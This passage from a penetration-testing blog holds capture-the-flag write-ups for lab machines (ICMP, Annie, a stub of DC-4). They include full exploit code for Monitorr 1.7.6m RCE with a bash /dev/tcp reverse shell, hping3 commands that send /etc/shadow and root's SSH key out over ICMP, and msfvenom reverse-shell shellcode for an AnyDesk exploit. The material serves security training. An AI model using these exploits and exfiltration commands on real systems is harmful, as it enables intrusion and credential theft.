‚åö 7 min\nIntroduction This is a Proving Grounds room which can be found at: DC-4\nA double edged sword\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.142.195  geobour98@kali:~$ nmap -p- -T4 -v 192.168.142.195 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-28 19:48 EEST Initiating Ping Scan at 19:48 Scanning 192.168.142.195 [2 ports] Completed Ping Scan at 19:48, 0.","title":"Proving Grounds - DC-4"},{"content":"üìÜ 18/09/2022 - geobour98 ‚åö 7 min\nIntroduction This is a Proving Grounds room which can be found at: ICMP\nFeel free to ping me\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0.06s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 20:39 Completed Parallel DNS resolution of 1 host. at 20:39, 0.00s elapsed Initiating Connect Scan at 20:39 Scanning 192.168.200.218 (192.168.200.218) [65535 ports] Discovered open port 80/tcp on 192.168.200.218 Discovered open port 22/tcp on 192.168.200.218 Completed Connect Scan at 20:39, 19.62s elapsed (65535 total ports) Nmap scan report for 192.168.200.218 (192.168.200.218) Host is up (0.058s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 192.168.200.218  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:43 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating Ping Scan at 20:43 Scanning 192.168.200.218 [4 ports] Completed Ping Scan at 20:43, 0.10s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 20:43 Completed Parallel DNS resolution of 1 host. at 20:43, 0.00s elapsed Initiating SYN Stealth Scan at 20:43 Scanning 192.168.200.218 (192.168.200.218) [2 ports] Discovered open port 80/tcp on 192.168.200.218 Discovered open port 22/tcp on 192.168.200.218 Completed SYN Stealth Scan at 20:43, 0.12s elapsed (2 total ports) Initiating Service scan at 20:43 Scanning 2 services on 192.168.200.218 (192.168.200.218) Completed Service scan at 20:43, 6.13s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 192.168.200.218 (192.168.200.218) Retrying OS detection (try #2) against 192.168.200.218 (192.168.200.218) Initiating Traceroute at 20:43 Completed Traceroute at 20:43, 0.06s elapsed Initiating Parallel DNS resolution of 1 host. at 20:43 Completed Parallel DNS resolution of 1 host. at 20:43, 0.00s elapsed NSE: Script scanning 192.168.200.218. Initiating NSE at 20:43 Completed NSE at 20:43, 1.93s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.23s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Nmap scan report for 192.168.200.218 (192.168.200.218) Host is up (0.059s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f (RSA) | 256 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a (ECDSA) |_ 256 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-title: Monitorr | Monitorr |_Requested resource was http://192.168.200.218/mon/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.38 (Debian) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 2.6.18 (91%), Linux 4.15 - 5.6 (90%), Linux 5.0 (90%), Linux 2.6.32 (90%), Linux 3.4 (90%), Linux 3.5 (90%), Linux 3.7 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Synology DiskStation Manager 5.1 (90%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 47.380 days (since Thu Jul 21 11:36:21 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=262 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 58.96 ms 192.168.49.1 (192.168.49.1) 2 58.32 ms 192.168.200.218 (192.168.200.218)  NSE: Script Post-scanning. Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Initiating NSE at 20:43 Completed NSE at 20:43, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.91 seconds  Raw packets sent: 78 (5.316KB) | Rcvd: 36 (2.872KB) Navigate to port 80 and at the bottom of the web page notice the version Monitorr 1.7.6m. Then put the version found on searchsploit. Command: searchsploit monitorr 1.7.6m\ngeobour98@kali:~$ searchsploit monitorr 1.7.6m ----------------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ----------------------------------------------------------------------------- --------------------------------- Monitorr 1.7.6m - Authorization Bypass | php/webapps/48981.py Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) | php/webapps/48980.py ----------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploitation Then, we can mirror the exploit: php/webapps/48980.py. Command: searchsploit -m php/webapps/48980.py\nDon\u0026rsquo;t modify the script and it should look like this:\n#!/usr/bin/python # -*- coding: UTF-8 -*-  # Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated) # Date: September 12, 2020 # Exploit Author: Lyhin\u0026#39;s Lab # Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/ # Software Link: https://github.com/Monitorr/Monitorr # Version: 1.7.6m # Tested on: Ubuntu 19  import requests import os import sys  if len (sys.argv) != 4:  print (\u0026#34;specify params in format: python \u0026#34; + sys.argv[0] + \u0026#34; target_url lhost lport\u0026#34;) else:  url = sys.argv[1] + \u0026#34;/assets/php/upload.php\u0026#34;  headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/plain, */*; q=0.01\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745\u0026#34;, \u0026#34;Origin\u0026#34;: sys.argv[1], \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Referer\u0026#34;: sys.argv[1]}   data = \u0026#34;-----------------------------31046105003900160576454225745\\r\\nContent-Disposition: form-data; name=\\\u0026#34;fileToUpload\\\u0026#34;; filename=\\\u0026#34;she_ll.php\\\u0026#34;\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a213213123\u0026lt;?php shell_exec(\\\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026#34;+sys.argv[2] +\u0026#34;/\u0026#34; + sys.argv[3] + \u0026#34; 0\u0026gt;\u0026amp;1\u0026#39;\\\u0026#34;);\\r\\n\\r\\n-----------------------------31046105003900160576454225745--\\r\\n\u0026#34;   requests.post(url, headers=headers, data=data)   print (\u0026#34;A shell script should be uploaded. Now we try to execute it\u0026#34;)  url = sys.argv[1] + \u0026#34;/assets/data/usrimg/she_ll.php\u0026#34;  headers = {\u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;en-US,en;q=0.5\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;close\u0026#34;, \u0026#34;Upgrade-Insecure-Requests\u0026#34;: \u0026#34;1\u0026#34;}  requests.get(url, headers=headers) Then run the python script. Command: python 48980.py http://192.168.217.218/mon/ 192.168.49.217 443\ngeobour98@kali:~$ python 48980.py http://192.168.217.218/mon/ 192.168.49.217 443 A shell script should be uploaded. Now we try to execute it Before running it, open a netcat listener on 443 port.\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [192.168.49.200] from (UNKNOWN) [192.168.200.218] 42540 bash: cannot set terminal process group (570): Inappropriate ioctl for device bash: no job control in this shell www-data@icmp:/var/www/html/mon/assets/data/usrimg$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; \u0026lt;img$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@icmp:/var/www/html/mon/assets/data/usrimg$ ^Z zsh: suspended nc -lvnp 443  geobour98@kali:~$ stty raw -echo;fg [1] + continued nc -lvnp 443 www-data@icmp:/var/www/html/mon/assets/data/usrimg$ export TERM=xterm-256color www-data@icmp:/var/www/html/mon/assets/data/usrimg$ stty rows 38 cols 111 www-data@icmp:/var/www/html/mon/assets/data/usrimg$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Now, we have a reverse shell as the www-data user. There is an interesting file reminder in /home/fox/ with contents:\ncrypt with crypt.php: done, it works work on decrypt with crypt.php: howto?!? We try to find crypt.php in the filesystem, but no luck there. Then, we see an interesting folder devel in /home/fox/, where we have execute permissions but not read. Navigate there and try to open the file.\nwww-data@icmp:/home/fox$ find / -type f -name crypt.php 2\u0026gt;/dev/null www-data@icmp:/home/fox$ cd devel www-data@icmp:/home/fox/devel$ cat crypt.php \u0026lt;?php echo crypt(\u0026#39;[REDACTED]\u0026#39;,\u0026#39;da\u0026#39;); ?\u0026gt; www-data@icmp:/home/fox/devel$ The crypt function takes a string, which is the cleartext password ([REDACTED]) for the user fox, and a salt and then returns a hashed string. Now we can switch to user fox.\nwww-data@icmp:/home/fox/devel$ su fox Password: $ bash fox@icmp:~/devel$ id uid=1000(fox) gid=1000(fox) groups=1000(fox) fox@icmp:~/devel$ cd .. fox@icmp:~$ cat local.txt [REDACTED] Privilege Escalation After executing the command: sudo -l we see that we can execute hping3 as root.\nfox@icmp:~$ sudo -l [sudo] password for fox: Matching Defaults entries for fox on icmp:  env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin  User fox may run the following commands on icmp:  (root) /usr/sbin/hping3 --icmp *  (root) /usr/bin/killall hping3 Unfortunately, we can\u0026rsquo;t execute the sudo command for hping3 from https://gtfobins.github.io/gtfobins/hping3/#sudo, because of the necessary --icmp. Then, from the help menu of hping3 we identify 2 interesting parameters: -d (data from file) and -E (data from file).\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -h usage: hping3 host [options]  -h --help show this help [REDACTED] Common  -d --data data size (default is 0)  -E --file data from file  -e --sign add \u0026#39;signature\u0026#39;  -j --dump dump packets in hex  -J --print dump printable characters  -B --safe enable \u0026#39;safe\u0026#39; protocol  -u --end tell you when --file reached EOF and prevent rewind [REDACTED] With the parameters -d and -E we can exfiltrate data from files through icmp protocol. Command: sudo /usr/sbin/hping3 --icmp -d 1416 -E /etc/shadow 192.168.49.200\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d 1416 -E /etc/shadow 192.168.49.200 HPING 192.168.49.200 (ens160 192.168.49.200): icmp mode set, 28 headers + 1416 data bytes [main] memlockall(): Operation not supported Warning: can\u0026#39;t disable memory paging! len=1444 ip=192.168.49.200 ttl=63 id=2130 icmp_seq=0 rtt=62.3 ms len=1444 ip=192.168.49.200 ttl=63 id=2238 icmp_seq=1 rtt=62.2 ms len=1444 ip=192.168.49.200 ttl=63 id=2292 icmp_seq=2 rtt=62.1 ms len=1444 ip=192.168.49.200 ttl=63 id=2508 icmp_seq=3 rtt=61.9 ms len=1444 ip=192.168.49.200 ttl=63 id=2619 icmp_seq=4 rtt=61.8 ms len=1444 ip=192.168.49.200 ttl=63 id=2647 icmp_seq=5 rtt=61.7 ms len=1444 ip=192.168.49.200 ttl=63 id=2794 icmp_seq=6 rtt=69.6 ms ^C --- 192.168.49.200 hping statistic --- 7 packets transmitted, 7 packets received, 0% packet loss round-trip min/avg/max = 61.7/63.1/69.6 ms Before running the hping3 command, we should run tcpdump to receive the contents of /etc/shadow.\ngeobour98@kali:~$ sudo tcpdump icmp -i tun0 -w icmp.pcap The output is saved on icmp.pcap, which can be opened with wireshark.\ngeobour98@kali:~$ wireshark icmp.pcap root:[REDACTED]:19195:0:99999:7::: daemon:*:18545:0:99999:7::: bin:*:18545:0:99999:7::: sys:*:18545:0:99999:7::: sync:*:18545:0:99999:7::: games:*:18545:0:99999:7::: man:*:18545:0:99999:7::: lp:*:18545:0:99999:7::: mail:*:18545:0:99999:7::: news:*:18545:0:99999:7::: uucp:*:18545:0:99999:7::: proxy:*:18545:0:99999:7::: www-data:*:18545:0:99999:7::: backup:*:18545:0:99999:7::: list:*:18545:0:99999:7::: irc:*:18545:0:99999:7::: gnats:*:18545:0:99999:7::: nobody:*:18545:0:99999:7::: _apt:*:18545:0:99999:7::: systemd-timesync:*:18545:0:99999:7::: systemd-network:*:18545:0:99999:7::: systemd-resolve:*:18545:0:99999:7::: messagebus:*:18545:0:99999:7::: sshd:*:18545:0:99999:7::: avahi:*:18545:0:99999:7::: saned:*:18545:0:99999:7::: colord:*:18545:0:99999:7::: hplip:*:18545:0:99999:7::: systemd-coredump:!!:18545:::::: fox:[REDACTED]:18599:0:99999:7::: Also before trying to crack the root hash, we can try to exfiltrate the private SSH key of root, if there is one. Command: sudo /usr/sbin/hping3 --icmp -d 1416 -E /root/.ssh/id_rsa 192.168.49.200\nfox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d 1416 -E /root/.ssh/id_rsa 192.168.49.200 HPING 192.168.49.200 (ens160 192.168.49.200): icmp mode set, 28 headers + 1416 data bytes [main] memlockall(): Operation not supported Warning: can\u0026#39;t disable memory paging! len=1444 ip=192.168.49.200 ttl=63 id=25397 icmp_seq=0 rtt=61.6 ms len=1444 ip=192.168.49.200 ttl=63 id=25460 icmp_seq=1 rtt=61.4 ms len=1444 ip=192.168.49.200 ttl=63 id=25639 icmp_seq=2 rtt=61.1 ms len=1444 ip=192.168.49.200 ttl=63 id=25839 icmp_seq=3 rtt=61.0 ms len=1444 ip=192.168.49.200 ttl=63 id=25890 icmp_seq=4 rtt=68.9 ms len=1444 ip=192.168.49.200 ttl=63 id=26060 icmp_seq=5 rtt=60.8 ms ^C --- 192.168.49.200 hping statistic --- 6 packets transmitted, 6 packets received, 0% packet loss round-trip min/avg/max = 60.8/62.5/68.9 ms Before running the hping3 command, we should run tcpdump to receive the contents of /root/.ssh/id_rsa.\ngeobour98@kali:~$ sudo tcpdump icmp -i tun0 -w ssh.pcap The output is saved on ssh.pcap, which can be opened with wireshark.\ngeobour98@kali:~$ wireshark ssh.pcap -----BEGIN OPENSSH PRIVATE KEY----- [REDACTED] -----END OPENSSH PRIVATE KEY----- Then we create a file id_rsa from the ssh.pcap, change it\u0026rsquo;s permissions and ssh as root.\ngeobour98@kali:~$ chmod 600 id_rsa geobour98@kali:~$ ssh -i id_rsa root@192.168.200.218 Linux icmp 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64  The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Sep 6 18:31:36 2022 from 192.168.49.200 root@icmp:~# id uid=0(root) gid=0(root) groups=0(root) root@icmp:~# cat proof.txt [REDACTED] Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/pg/icmp/","summary":"üìÜ 18/09/2022 - geobour98 ‚åö 7 min\nIntroduction This is a Proving Grounds room which can be found at: ICMP\nFeel free to ping me\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 192.168.200.218  geobour98@kali:~$ nmap -p- -T4 -v 192.168.200.218 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-06 20:39 EEST Initiating Ping Scan at 20:39 Scanning 192.168.200.218 [2 ports] Completed Ping Scan at 20:39, 0.","title":"Proving Grounds - ICMP"},{"content":"üìÜ 27/08/2022 - geobour98 ‚åö 6 min\nIntroduction This is a TryHackMe room which can be found at: Annie\nRemote access comes in different flavors.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:40 Completed Parallel DNS resolution of 1 host. at 13:40, 0.00s elapsed Initiating Connect Scan at 13:40 Scanning 10.10.235.134 (10.10.235.134) [65535 ports] Discovered open port 22/tcp on 10.10.235.134 Discovered open port 40045/tcp on 10.10.235.134 Discovered open port 33401/tcp on 10.10.235.134 Discovered open port 7070/tcp on 10.10.235.134 Completed Connect Scan at 13:41, 75.81s elapsed (65535 total ports) Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.077s latency). Not shown: 65477 closed tcp ports (conn-refused), 54 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 7070/tcp open realserver 33401/tcp open unknown 40045/tcp open unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 76.00 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134  geobour98@kali:~$ sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:48 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating Ping Scan at 13:48 Scanning 10.10.235.134 [4 ports] Completed Ping Scan at 13:48, 0.17s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:48 Completed Parallel DNS resolution of 1 host. at 13:48, 0.00s elapsed Initiating SYN Stealth Scan at 13:48 Scanning 10.10.235.134 (10.10.235.134) [4 ports] Discovered open port 22/tcp on 10.10.235.134 Discovered open port 7070/tcp on 10.10.235.134 Completed SYN Stealth Scan at 13:48, 0.13s elapsed (4 total ports) Initiating Service scan at 13:48 Scanning 2 services on 10.10.235.134 (10.10.235.134) Completed Service scan at 13:48, 12.71s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #2) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #3) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #4) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #5) against 10.10.235.134 (10.10.235.134) Initiating Traceroute at 13:48 Completed Traceroute at 13:48, 0.11s elapsed Initiating Parallel DNS resolution of 1 host. at 13:48 Completed Parallel DNS resolution of 1 host. at 13:48, 0.00s elapsed NSE: Script scanning 10.10.235.134. Initiating NSE at 13:48 Completed NSE at 13:48, 4.29s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.48s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.10s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA) | 256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA) |_ 256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519) 7070/tcp open ssl/realserver? | ssl-cert: Subject: commonName=AnyDesk Client | Issuer: commonName=AnyDesk Client | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-03-23T20:04:30 | Not valid after: 2072-03-10T20:04:30 | MD5: 3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0 |_SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b |_ssl-date: TLS randomness does not represent time 33401/tcp closed unknown 40045/tcp closed unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=8/27%OT=22%CT=33401%CU=35227%PV=Y%DS=2%DC=T%G=Y%TM=630 OS:9F69B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A OS:)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11N OS:W6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=F4B3 OS:%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505 OS:NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F= OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T= OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  Uptime guess: 8.332 days (since Fri Aug 19 05:50:26 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 40045/tcp) HOP RTT ADDRESS 1 65.90 ms 10.8.0.1 (10.8.0.1) 2 100.64 ms 10.10.235.134 (10.10.235.134)  NSE: Script Post-scanning. Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds  Raw packets sent: 129 (9.702KB) | Rcvd: 87 (6.958KB) The interesting port is 7070, with AnyDesk Client service. After googling about anydesk client 7070 exploit we identified this great article: https://devel0pment.de/?p=1881 about AnyDesk UDP version 5.5.2 Remote Code execution. A string format vulnerability is exploited on UDP port 50001. So now we are going to perform a UDP nmap scan on that port.\n  Command: sudo nmap -sU -v -p 50001 10.10.235.134  geobour98@kali:~$ sudo nmap -sU -v -p 50001 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 15:40 EEST Initiating Ping Scan at 15:40 Scanning 10.10.235.134 [4 ports] Completed Ping Scan at 15:40, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 15:40 Completed Parallel DNS resolution of 1 host. at 15:40, 0.01s elapsed Initiating UDP Scan at 15:40 Scanning 10.10.235.134 (10.10.235.134) [1 port] Completed UDP Scan at 15:40, 0.93s elapsed (1 total ports) Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.088s latency).  PORT STATE SERVICE 50001/udp open|filtered unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds  Raw packets sent: 6 (288B) | Rcvd: 1 (28B) Exploitation The UDP port 50001 is either open or filtered by a firewall. Also, in the article there is a PoC python script in order to exploit the vulnerability, which can be found also with searchsploit command.\n  Command: searchsploit anydesk  geobour98@kali:~$ searchsploit anydesk ----------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ----------------------------------------------------------------------- --------------------------------- AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation | windows/local/40410.txt AnyDesk 5.4.0 - Unquoted Service Path | windows/local/47883.txt AnyDesk 5.5.2 - Remote Code Execution | linux/remote/49613.py ----------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Command to mirror (copy) the exploit: searchsploit -m linux/remote/49613.py  We have to change the ip variable with our Annie machine IP and generate python shellcode to replace the already created in order to get a reverse shell. It is generated with msfvenom.\n  Command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \u0026quot;\\x00\\x25\\x26\u0026quot; -f python -v shellcode  geobour98@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \u0026#34;\\x00\\x25\\x26\u0026#34; -f python -v shellcode shellcode = b\u0026#34;\u0026#34; shellcode += b\u0026#34;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\u0026#34; shellcode += b\u0026#34;\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xf1\\x7c\\x94\u0026#34; shellcode += b\u0026#34;\\xa2\\x97\\xa9\\x17\\x7b\\x48\\x31\\x58\\x27\\x48\\x2d\u0026#34; shellcode += b\u0026#34;\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x9b\\x55\\xcc\\x3b\\xfd\u0026#34; shellcode += b\u0026#34;\\xab\\x48\\x11\\xf0\\x22\\x9b\\xa7\\xdf\\x3e\\x5f\\xc2\u0026#34; shellcode += b\u0026#34;\\xf3\\x7c\\x95\\x19\\x9d\\xa1\\xdf\\x49\\xa0\\x34\\x1d\u0026#34; shellcode += b\u0026#34;\\x44\\xfd\\xb9\\x4d\\x11\\xdb\\x24\\x9b\\xa7\\xfd\\xaa\u0026#34; shellcode += b\u0026#34;\\x49\\x33\\x0e\\xb2\\xfe\\x83\\xcf\\xa6\\x12\\x0e\\x07\u0026#34; shellcode += b\u0026#34;\\x16\\xaf\\xfa\\x0e\\xe1\\xac\\x54\\x93\\x15\\xfa\\x8d\u0026#34; shellcode += b\u0026#34;\\xe4\\xc1\\x17\\x28\\xb9\\xf5\\x73\\xf0\\xc0\\xe1\\x9e\u0026#34; shellcode += b\u0026#34;\\x9d\\xfe\\x79\\x94\\xa2\\x97\\xa9\\x17\\x7b\u0026#34; Then replace the shellcode in the python script with the generated one. The final version of the script should look like this:\n# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution # Date: 09/06/20 # Exploit Author: scryh # Vendor Homepage: https://anydesk.com/en # Version: 5.5.2 # Tested on: Linux # Walkthrough: https://devel0pment.de/?p=1881  #!/usr/bin/env python import struct import socket import sys  ip = \u0026#39;10.10.235.134\u0026#39; port = 50001  def gen_discover_packet(ad_id, os, hn, user, inf, func):  d = chr(0x3e)+chr(0xd1)+chr(0x1)  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, ad_id)  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, 0)  d += chr(0x2)+chr(os)  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(hn)) + hn  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(user)) + user  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, 0)  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(inf)) + inf  d += chr(0)  d += struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(func)) + func  d += chr(0x2)+chr(0xc3)+chr(0x51)  return d  # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \u0026#34;\\x00\\x25\\x26\u0026#34; -f python -v shellcode shellcode = b\u0026#34;\u0026#34; shellcode += b\u0026#34;\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\u0026#34; shellcode += 